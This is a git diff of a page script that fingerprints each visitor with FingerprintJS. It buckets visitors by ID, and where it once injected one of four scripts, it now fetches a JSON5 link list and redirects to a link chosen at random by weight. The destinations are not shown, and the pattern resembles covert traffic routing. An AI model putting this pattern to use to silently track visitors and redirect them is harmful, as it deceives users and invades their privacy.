@@ -1,14 +1,14 @@
 document.addEventListener('DOMContentLoaded', function() {
 
-  function jsForVisitorId(visitorId) {
-    if (startsWithAny(visitorId, ['1', '2', '3', '4'])) {
-      return 'rx0.js';
-    } else if (startsWithAny(visitorId, ['5', '6', '7', '8'])) {
-      return 'rx1.js';
-    } else if (startsWithAny(visitorId, ['9', 'a', 'b', 'c'])) {
-      return 'rx2.js';
+  function jsonForVisitorId(visitorId) {
+    if (startsWithAny(visitorId, ['0', '1', '2', '3'])) {
+      return 'rx0.json';
+    } else if (startsWithAny(visitorId, ['4', '5', '6', '7'])) {
+      return 'rx1.json';
+    } else if (startsWithAny(visitorId, ['8', '9', 'a', 'b'])) {
+      return 'rx2.json';
     } else {
-      return 'rx3.js';
+      return 'rx3.json';
     }
   }
 
@@ -16,21 +16,7 @@ document.addEventListener('DOMContentLoaded', function() {
     return prefixes.some(prefix => str.startsWith(prefix));
   }  
 
-  FingerprintJS.load().then(fp => {
-    fp.get().then(result => {
-      const visitorId = result.visitorId || "abcdef123456"; 
-      // console.log(visitorId);
-      const jsFile = jsForVisitorId(visitorId);
-      if (jsFile) {
-        const script = document.createElement('script');
-        script.src = jsFile;
-        document.body.appendChild(script);
-      }
-    });
-  });
-
-  window.redirectSelectLinkByWeight = function(links) {
-    
+  function redirectSelectLinkByWeight(links) {
     function selectLinkByWeight(_links) {
       const links = _links.filter(link => link.w && link.w > 0);
       const totalWeight = links.reduce((acc, link) => acc + link.w, 0);
@@ -63,4 +49,25 @@ document.addEventListener('DOMContentLoaded', function() {
       console.error('No valid redirect URL found.');
     }
   }
+
+  FingerprintJS.load().then(fp => {
+    fp.get().then(result => {
+      const visitorId = result.visitorId || "abcdef123456";
+      const jsonFile = jsonForVisitorId(visitorId);
+      if (jsonFile) {
+        fetch(jsonFile).then(response => response.text()).then(text => {
+          try {
+            const links = JSON5.parse(text);  // 使用 JSON5 解析文本
+            // console.log(links);
+            redirectSelectLinkByWeight(links);
+          } catch (error) {
+            console.error('无法解析 JSON 文件:', error);
+          }
+        }).catch(error => {
+          console.error('无法加载 JSON 文件:', error);
+        });
+      }
+    });
+  });
+
 });
